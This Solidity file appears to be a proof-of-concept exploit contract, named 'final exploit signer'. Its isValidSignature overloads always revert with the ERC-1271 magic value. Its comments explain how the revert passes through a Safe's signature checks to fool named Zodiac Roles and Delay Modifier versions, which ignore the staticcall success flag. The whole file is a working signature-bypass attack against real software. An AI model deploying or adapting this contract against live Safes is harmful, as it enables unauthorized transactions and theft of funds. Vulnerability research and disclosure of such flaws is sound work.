// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/**
 * @title RevertMagic1271 (final exploit signer)
 * @notice Contract signer that ALWAYS fails ERC-1271 validation by reverting
 *         with a payload that starts with the magic value 0x1626ba7e.
 *
 * @dev Why reverting works:
 *
 *   Zodiac Roles Modifier v2.1.0 / Delay Modifier v1.1.0
 *   (legacy @gnosis.pm/zodiac Modifier.sol -> SignatureChecker):
 *
 *       (, bytes memory returnData) = signer.staticcall(
 *           abi.encodeWithSelector(IERC1271.isValidSignature.selector, hash, signature)
 *       );
 *       return bytes4(returnData) == EIP1271_MAGIC_VALUE;   // <-- `success` is DISCARDED
 *
 *   The boolean success flag of the staticcall is thrown away, so revert
 *   data is treated exactly like return data. Any signer contract whose
 *   isValidSignature reverts with 0x1626ba7e is accepted as a valid signer.
 *
 *   In the real composition the Zodiac `signer` is a Safe that has the
 *   CompatibilityFallbackHandler. The handler forwards the validation to
 *   Safe.checkSignatures, which staticcalls THIS contract as a contract
 *   signer (v == 0). Our revert-with-magic bubbles all the way back:
 *
 *     RevertMagic1271
 *       -> Safe.checkSignatures (reverts, payload = 0x1626ba7e)
 *         -> CompatibilityFallbackHandler.isValidSignature (propagates)
 *           -> Safe fallback / proxy fallback (propagates returndata)
 *             -> Zodiac _isValidContractSignature  => bytes4(returndata) == 0x1626ba7e => VALID
 *
 *   Both overloads are implemented so the trick works no matter which
 *   ERC-1271 selector the verifier ends up calling.
 */
contract RevertMagic1271 {
    bytes4 constant MAGIC_VALUE = 0x1626ba7e;

    /**
     * @notice selector 0x1626ba7e - isValidSignature(bytes32,bytes)
     * @dev This is the overload reached from Safe.checkSignatures.
     *      It NEVER returns: it always reverts with the magic value.
     *      (The `returns (bytes4)` is declared only to keep the exact
     *      ERC-1271 signature; the revert makes it unreachable.)
     */
    function isValidSignature(
        bytes32 /*hash*/,
        bytes calldata /*signature*/
    ) external pure returns (bytes4) {
        assembly {
            // word = 0x1626ba7e0000...00 ; revert with the first 4 bytes only
            mstore(0x00, shl(224, 0x1626ba7e))
            revert(0x00, 0x04)
        }
    }

    /**
     * @notice selector 0x20c13b0b - isValidSignature(bytes,bytes)
     * @dev Same behavior for the dynamic-data variant.
     *      (equivalent to the original shl(225, 0x0b135d3f) obfuscation:
     *       0x0b135d3f << 225 == 0x1626ba7e << 224)
     */
    function isValidSignature(
        bytes calldata /*data*/,
        bytes calldata /*signature*/
    ) external pure {
        assembly {
            mstore(0x00, shl(224, 0x1626ba7e))
            revert(0x00, 0x04)
        }
    }
}
